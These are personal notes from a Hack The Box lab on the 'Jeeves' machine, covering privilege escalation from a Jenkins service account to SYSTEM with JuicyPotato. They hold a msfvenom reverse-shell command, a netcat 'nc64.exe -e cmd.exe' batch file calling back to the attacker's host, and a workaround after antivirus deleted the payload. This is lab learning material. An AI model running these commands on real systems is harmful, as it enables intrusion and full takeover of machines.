# Priv Esc
- Basic information first
- We are a member of `NT AUTHORITY\SERVICE` and have `SeImpersonatePrivilege` so we should be able to JuicyPotato
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ nc -nvlp 80
Listening on 0.0.0.0 80
Connection received on 10.10.10.63 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins\workspace\EvilProject>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```
- Systeminfo
```
Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          8/2/2022, 12:14:57 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,081 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,636 MB
Virtual Memory: In Use:    1,051 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.63
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.


```
- Also have some possible creds
```
C:\Users\Administrator\.jenkins\users\admin>type config.xml
type config.xml
<?xml version='1.0' encoding='UTF-8'?>
<user>
  <fullName>admin</fullName>
  <properties>
    <jenkins.security.ApiTokenProperty>
      <apiToken>{AQAAABAAAAAwID3cR3pyZaEkaDPU25Z0S+nrU8+gDgB0JEWORJ5L1P2T+zXc/tSs2IVn1ugWLaui54D6yYki4vhXQtGhqUSeFw==}</apiToken>
    </jenkins.security.ApiTokenProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1509762882255</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>

```

- Potentially an AV running
	- Definitely an AV running, meterpreter exes keep vanishing
```
C:\Windows\Temp\potato>tasklist
tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
[...]
MsMpEng.exe                   1792                            0     93,972 K
[...]
```

- Looks like some kind of blowfish cypher
```
┌──(kali㉿kali)-[~/…/boxes/htb/jeeves/nmap]
└─$ hashid '$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO'                                                                                                              130 ⨯
Analyzing '$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt

```

## Juicy Potato
```
C:\Windows\Temp\potato>powershell .\GetCLSID.ps1
powershell .\GetCLSID.ps1

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
HKCR                                   Registry      HKEY_CLASSES_ROOT
Looking for CLSIDs
Looking for APIDs
Joining CLSIDs and APIDs

PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Windows\Temp\potato\Windows_10_Pro
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Windows\Temp\potato
PSChildName       : Windows_10_Pro
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
PSIsContainer     : True
Name              : Windows_10_Pro
Parent            : potato
Exists            : True
Root              : C:\
FullName          : C:\Windows\Temp\potato\Windows_10_Pro
Extension         :
CreationTime      : 8/2/2022 1:49:08 PM
CreationTimeUtc   : 8/2/2022 5:49:08 PM
LastAccessTime    : 8/2/2022 1:49:08 PM
LastAccessTimeUtc : 8/2/2022 5:49:08 PM
LastWriteTime     : 8/2/2022 1:49:08 PM
LastWriteTimeUtc  : 8/2/2022 5:49:08 PM
Attributes        : Directory
Mode              : d-----
BaseName          : Windows_10_Pro
Target            : {}
LinkType          :




C:\Windows\Temp\potato>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Windows\Temp\potato

08/02/2022  01:49 PM    <DIR>          .
08/02/2022  01:49 PM    <DIR>          ..
06/18/2022  09:31 AM             1,580 GetCLSID.ps1
08/02/2022  01:47 PM           173,738 juicy-toolkit.zip
12/07/2021  12:35 AM           347,648 JuicyPotato.exe
03/09/2021  09:08 PM               285 test_clsid.bat
08/02/2022  01:49 PM    <DIR>          Windows_10_Pro
               4 File(s)        523,251 bytes
               3 Dir(s)   7,462,842,368 bytes free

C:\Windows\Temp\potato>cd windows*
cd windows*

C:\Windows\Temp\potato\Windows_10_Pro>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Windows\Temp\potato\Windows_10_Pro

08/02/2022  01:49 PM    <DIR>          .
08/02/2022  01:49 PM    <DIR>          ..
08/02/2022  01:49 PM             2,800 CLSID.list
08/02/2022  01:49 PM             6,753 CLSIDs.csv
               2 File(s)          9,553 bytes
               2 Dir(s)   7,462,842,368 bytes free

C:\Windows\Temp\potato\Windows_10_Pro>copy clsid.list ..\
copy clsid.list ..\
        1 file(s) copied.

C:\Windows\Temp\potato\Windows_10_Pro>cd ..
cd ..

C:\Windows\Temp\potato>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Windows\Temp\potato

08/02/2022  01:49 PM    <DIR>          .
08/02/2022  01:49 PM    <DIR>          ..
08/02/2022  01:49 PM             2,800 CLSID.list
06/18/2022  09:31 AM             1,580 GetCLSID.ps1
08/02/2022  01:47 PM           173,738 juicy-toolkit.zip
12/07/2021  12:35 AM           347,648 JuicyPotato.exe
03/09/2021  09:08 PM               285 test_clsid.bat
08/02/2022  01:49 PM    <DIR>          Windows_10_Pro
               5 File(s)        526,051 bytes
               3 Dir(s)   7,462,838,272 bytes free

C:\Windows\Temp\potato>.\test_clsid.bat
.\test_clsid.bat
{D6015EC3-FA16-4813-9CA1-DA204574F5DA} 10000
{9c212ed3-cfd2-4676-92d8-3fbb2c3a8379} 10000
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} 10001
{03ca98d6-ff5d-49b8-abc6-03dd84127020} 10002
{C7386F3F-B5EB-4AF4-B261-5DCA3BEEF7B1} 10003
{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029} 10003
{FD3659E9-A920-4123-AD64-7FC76C7AACDF} 10003
{69486DD6-C19F-42e8-B508-A53F9F8E67B8} 10003
{d20a3293-3341-4ae8-9aaf-8e397cb63c34} 10003
{42CBFAA7-A4A7-47BB-B422-BD10E9D02700} 10004
{5B99FA76-721C-423C-ADAC-56D03C8A8007} 10005
{7022a3b3-d004-4f52-af11-e9e987fee25f} 10006
{ddcfd26b-feed-44cd-b71d-79487d2e5e5a} 10006
{0A886F29-465A-4aea-8B8E-BE926BFAE83E} 10006
{8C482DCE-2644-4419-AEFF-189219F916B9} 10006
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744} 10006
{C63261E4-6052-41FF-B919-496FECF4C4E5} 10007
{42C21DF5-FB58-4102-90E9-96A213DC7CE8} 10008
{1BE1F766-5536-11D1-B726-00C04FB926AF} 10009
{D3DCB472-7261-43ce-924B-0704BD730D5F} 10010
{375ff002-dd27-11d9-8f9c-0002b3988e81} 10010
{35b1d3bb-2d4e-4a7c-9af0-f2f677af7c30} 10010
{145B4335-FE2A-4927-A040-7C35AD3180EF} 10010
{A188DB29-2ABC-46cb-9A38-40B82CF5D051} 10010
{6F7C8E8F-DC69-4e3f-BC05-439962A05FD5} 10010
{6CF9B800-50DB-46B5-9218-EACF07F5E414} 10010
{E0F55444-C140-4EF4-BDA3-621554EDB573} 10011
{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD} 10011
{22f5b1df-7d7a-4d21-97f8-c21aefba859c} 10012
{5BF9AA75-D7FF-4aee-AA2C-96810586456D} 10013
{5C03E1B1-EB13-4DF1-8943-2FE8E7D5F309} 10014
{000C101C-0000-0000-C000-000000000046} 10014
{6FE54E0E-009F-4E3D-A830-EDFA71E1F306} 10014
{A47979D2-C419-11D9-A5B4-001185AD2B89} 10014
{854A20FB-2D44-457D-992F-EF13785D2B51} 10015
{BA677074-762C-444b-94C8-8C83F93F6605} 10015
{47135eea-06b6-4452-8787-4a187c64a47e} 10015
{14E1D985-892F-4F52-A866-6B1AE6A53DFE} 10016
{555F3418-D99E-4E51-800A-6E89CFD8B1D7} 10016
{B6C292BC-7C88-41EE-8B54-8EC92617E599} 10016
{A1F4E726-8CF1-11D1-BF92-0060081ED811} 10016
{65EE1DBA-8FF4-4a58-AC1C-3470EE2F376A} 10016
{F9A874B6-F8A8-4D73-B5A8-AB610816828B} 10016
{50D185B9-FFF3-4656-92C7-E4018DA4361D} 10016
{4661626C-9F41-40A9-B3F5-5580E80CB347} 10016
{2c6594dc-04ad-490f-a447-dc8e2772e9cb} 10017
{F556F9B2-C810-44A2-BA7A-3AB8C24E666D} 10017
{3c6859ce-230b-48a4-be6c-932c0c202048} 10017
{0fb40f0d-1021-4022-8da0-aab0588dfc8b} 10018
{B91D5831-B1BD-4608-8198-D72E155020F7} 10019
{7D1933CB-86F6-4A98-8628-01BE94C9A575} 10020
{397a2e5f-348c-482d-b9a3-57d383b483cd} 10020
{0B5A2C52-3EB9-470a-96E2-6C6D4570E40F} 10020
{9A3E1311-23F8-42DC-815F-DDBC763D50BB} 10020
{97061DF1-33AA-4B30-9A92-647546D943F3} 10020
{02ECA72E-27DA-40E1-BDB1-4423CE649AD9} 10021
{84C22490-C68A-4492-B3A6-3B7CB17FA122} 10021
{119817C9-666D-4053-AEDA-627D0E25CCEF} 10021
{37734C4D-FFA8-4139-9AAC-60FBE55BF3DF} 10021
{FC5EEAF6-2001-11DF-ADB9-F4CE462D9137} 10021
{69B37063-2BB6-43b5-A109-60E69A77840F} 10021
{0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB} 10021
{2781761E-28E2-4109-99FE-B9D127C57AFE} 10021
{8BC3F05E-D86B-11D0-A075-00C04FB68820} 10021
{da1c0281-456b-4f14-a46d-8ed2e21a866f} 10022
{B474265E-3EF5-46E8-9FD9-AE034F34FC74} 10022
{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7} 10023
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 10024
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 10024
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 10025

C:\Windows\Temp\potato>

C:\Windows\Temp\potato>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Windows\Temp\potato

08/02/2022  01:49 PM    <DIR>          .
08/02/2022  01:49 PM    <DIR>          ..
08/02/2022  01:49 PM             2,800 CLSID.list
06/18/2022  09:31 AM             1,580 GetCLSID.ps1
08/02/2022  01:47 PM           173,738 juicy-toolkit.zip
12/07/2021  12:35 AM           347,648 JuicyPotato.exe
08/02/2022  01:52 PM             1,595 result.log
03/09/2021  09:08 PM               285 test_clsid.bat
08/02/2022  01:49 PM    <DIR>          Windows_10_Pro
               6 File(s)        527,646 bytes
               3 Dir(s)   7,462,694,912 bytes free

C:\Windows\Temp\potato>type result.log
type result.log
{9c212ed3-cfd2-4676-92d8-3fbb2c3a8379};NT AUTHORITY\SYSTEM
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8};NT AUTHORITY\SYSTEM
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM
{d20a3293-3341-4ae8-9aaf-8e397cb63c34};NT AUTHORITY\SYSTEM
{42CBFAA7-A4A7-47BB-B422-BD10E9D02700};NT AUTHORITY\SYSTEM
{5B99FA76-721C-423C-ADAC-56D03C8A8007};NT AUTHORITY\SYSTEM
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};NT AUTHORITY\SYSTEM
{C63261E4-6052-41FF-B919-496FECF4C4E5};NT AUTHORITY\SYSTEM
{42C21DF5-FB58-4102-90E9-96A213DC7CE8};NT AUTHORITY\SYSTEM
{1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\LOCAL SERVICE
{6CF9B800-50DB-46B5-9218-EACF07F5E414};NT AUTHORITY\SYSTEM
{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD};NT AUTHORITY\SYSTEM
{22f5b1df-7d7a-4d21-97f8-c21aefba859c};NT AUTHORITY\LOCAL SERVICE
{5BF9AA75-D7FF-4aee-AA2C-96810586456D};NT AUTHORITY\LOCAL SERVICE
{A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\LOCAL SERVICE
{47135eea-06b6-4452-8787-4a187c64a47e};NT AUTHORITY\SYSTEM
{4661626C-9F41-40A9-B3F5-5580E80CB347};NT AUTHORITY\SYSTEM
{3c6859ce-230b-48a4-be6c-932c0c202048};NT AUTHORITY\SYSTEM
{0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\LOCAL SERVICE
{B91D5831-B1BD-4608-8198-D72E155020F7};NT AUTHORITY\SYSTEM
{97061DF1-33AA-4B30-9A92-647546D943F3};NT AUTHORITY\SYSTEM
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
{B474265E-3EF5-46E8-9FD9-AE034F34FC74};NT AUTHORITY\SYSTEM
{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7};NT AUTHORITY\SYSTEM
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM


```
`9c212ed3-cfd2-4676-92d8-3fbb2c3a8379 10000`

- Create reverse shell
```
┌──(kali㉿kali)-[~/…/boxes/htb/jeeves/nmap]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=80 --format exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

- Transfer to box then execute
```
C:\Windows\Temp\potato>cmd /c ".\JuicyPotato.exe -l 10001 -p C:\windows\temp\potato\rev.exe -t * -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}"
cmd /c ".\JuicyPotato.exe -l 10001 -p C:\windows\temp\potato\rev.exe -t * -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}"
Testing {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} 10001
......
[+] authresult 0
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8};NT AUTHORITY\SYSTEM

[-] CreateProcessWithTokenW Failed to create proc: 2

[-] CreateProcessAsUser Failed to create proc: 2

C:\Windows\Temp\potato>cmd /c ".\JuicyPotato.exe -l 10000 -p C:\windows\temp\potato\rev.exe -t * -c {9c212ed3-cfd2-4676-92d8-3fbb2c3a8379}"
cmd /c ".\JuicyPotato.exe -l 10000 -p C:\windows\temp\potato\rev.exe -t * -c {9c212ed3-cfd2-4676-92d8-3fbb2c3a8379}"
Testing {9c212ed3-cfd2-4676-92d8-3fbb2c3a8379} 10000
......
[+] authresult 0
{9c212ed3-cfd2-4676-92d8-3fbb2c3a8379};NT AUTHORITY\SYSTEM

[-] CreateProcessWithTokenW Failed to create proc: 2

[-] CreateProcessAsUser Failed to create proc: 2


```

- Seems to fail??
	- NV, AV keeps cleaning up rev shell

- Put NC64.exe on disk instead
- Passing in args with -a to nc64.exe doesn't seem to work, so create a batch script
```
C:\Windows\Temp\potato>echo C:\windows\temp\potato\nc64.exe -e cmd.exe 10.10.14.8 80 >rev.bat
echo C:\windows\temp\potato\nc64.exe -e cmd.exe 10.10.14.8 80 >rev.bat
```

- Then execute
```
C:\Windows\Temp\potato>cmd /c .\JuicyPotato.exe -l 10002 -p C:\windows\temp\potato\rev.bat -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
cmd /c .\JuicyPotato.exe -l 10002 -p C:\windows\temp\potato\rev.bat -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 10002
......
[+] authresult 0
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK


```

- Catch shell
```
┌──(kali㉿kali)-[~/…/boxes/htb/jeeves/nmap]
└─$ nc -nvlp 80                                                                                                                                                                        130 ⨯
Listening on 0.0.0.0 80
Connection received on 10.10.10.63 49933
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                             Attributes
====================================== ================ =============================================================== ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384
Everyone                               Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\BDESVC                      Well-known group S-1-5-80-2962817144-200689703-2266453665-3849882635-1986547430  Enabled by default, Group owner
NT SERVICE\BITS                        Well-known group S-1-5-80-864916184-135290571-3087830041-1716922880-4237303741   Enabled by default, Enabled group, Group owner
NT SERVICE\CertPropSvc                 Well-known group S-1-5-80-3256172449-2363790065-3617575471-4144056108-756904704  Enabled by default, Group owner
NT SERVICE\DcpSvc                      Well-known group S-1-5-80-1436340521-1614496842-1630426791-3450112370-1043762698 Enabled by default, Group owner
NT SERVICE\dmwappushservice            Well-known group S-1-5-80-3841379657-834162867-3056945855-2577476187-70241904    Enabled by default, Group owner
NT SERVICE\DoSvc                       Well-known group S-1-5-80-3055155277-3816794035-3994065555-2874236192-2193176987 Enabled by default, Group owner
NT SERVICE\DsmSvc                      Well-known group S-1-5-80-286057374-2594772386-1471686342-3682429118-820474675   Enabled by default, Enabled group, Group owner
NT SERVICE\Eaphost                     Well-known group S-1-5-80-3578261754-285310837-913589462-2834155770-667502746    Enabled by default, Group owner
NT SERVICE\IKEEXT                      Well-known group S-1-5-80-698886940-375981264-2691324669-2937073286-3841916615   Enabled by default, Group owner
NT SERVICE\iphlpsvc                    Well-known group S-1-5-80-62724632-2456781206-3863850748-1496050881-1042387526   Enabled by default, Enabled group, Group owner
NT SERVICE\LanmanServer                Well-known group S-1-5-80-879696042-2351668846-370232824-2524288904-4023536711   Enabled by default, Enabled group, Group owner
NT SERVICE\lfsvc                       Well-known group S-1-5-80-3704025948-1094794811-1175534343-2088422159-783153058  Enabled by default, Enabled group, Group owner
NT SERVICE\MSiSCSI                     Well-known group S-1-5-80-917953661-2020045820-2727011118-2260243830-4032185929  Enabled by default, Group owner
NT SERVICE\NcaSvc                      Well-known group S-1-5-80-154974075-1852685594-3179713959-2755908004-3936262621  Enabled by default, Group owner
NT SERVICE\NetSetupSvc                 Well-known group S-1-5-80-3290392786-819420393-1694314755-3737624005-3552167228  Enabled by default, Group owner
NT SERVICE\RasAuto                     Well-known group S-1-5-80-1802467488-1541022566-2033325545-854566965-652742428   Enabled by default, Group owner
NT SERVICE\RasMan                      Well-known group S-1-5-80-4176366874-305252471-2256717057-2714189771-3552532790  Enabled by default, Group owner
NT SERVICE\RemoteAccess                Well-known group S-1-5-80-1954729425-4294152082-187165618-318331177-3831297489   Enabled by default, Group owner
NT SERVICE\RetailDemo                  Well-known group S-1-5-80-457603595-166122335-4119162879-888033224-3685571132    Enabled by default, Group owner
NT SERVICE\Schedule                    Well-known group S-1-5-80-4125092361-1567024937-842823819-2091237918-836075745   Enabled by default, Enabled group, Group owner
NT SERVICE\SCPolicySvc                 Well-known group S-1-5-80-1691538513-4084330536-1620899472-1113280783-3554754292 Enabled by default, Group owner
NT SERVICE\SENS                        Well-known group S-1-5-80-4259241309-1822918763-1176128033-1339750638-3428293995 Enabled by default, Enabled group, Group owner
NT SERVICE\SessionEnv                  Well-known group S-1-5-80-4022436659-1090538466-1613889075-870485073-3428993833  Enabled by default, Group owner
NT SERVICE\SharedAccess                Well-known group S-1-5-80-2009329905-444645132-2728249442-922493431-93864177     Enabled by default, Group owner
NT SERVICE\ShellHWDetection            Well-known group S-1-5-80-1690854464-3758363787-3981977099-3843555589-1401248062 Enabled by default, Enabled group, Group owner
NT SERVICE\UsoSvc                      Well-known group S-1-5-80-223807737-1693445485-119162242-1977420160-1403034029   Enabled by default, Group owner
NT SERVICE\wercplsupport               Well-known group S-1-5-80-3594706986-2537596223-181334840-1741483385-1351671666  Enabled by default, Group owner
NT SERVICE\Winmgmt                     Well-known group S-1-5-80-3750560858-172214265-3889451188-1914796615-4100997547  Enabled by default, Enabled group, Group owner
NT SERVICE\wlidsvc                     Well-known group S-1-5-80-2952724807-2252311773-3412998076-2712868122-780978283  Enabled by default, Group owner
NT SERVICE\wuauserv                    Well-known group S-1-5-80-1014140700-3308905587-3330345912-272242898-93311788    Enabled by default, Group owner
NT SERVICE\XboxNetApiSvc               Well-known group S-1-5-80-1352715831-1104254428-97934242-2131353953-1898040052   Enabled by default, Group owner
LOCAL                                  Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                 Alias            S-1-5-32-544                                                    Enabled by default, Enabled group, Group owner


PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= =======
SeAssignPrimaryTokenPrivilege   Replace a process level token             Enabled
SeLockMemoryPrivilege           Lock pages in memory                      Enabled
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeTcbPrivilege                  Act as part of the operating system       Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeCreatePermanentPrivilege      Create permanent shared objects           Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeAuditPrivilege                Generate security audits                  Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled


C:\Windows\system32>whoami
whoami
nt authority\system

```

- Root.txt file is not in the normal place, uses alternative data streams
```
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

08/02/2022  02:45 PM    <DIR>          .
08/02/2022  02:45 PM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
08/02/2022  02:45 PM            36,864 sam
08/02/2022  02:45 PM        12,046,336 system
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               4 File(s)     12,084,033 bytes
               2 Dir(s)   7,178,801,152 bytes free

```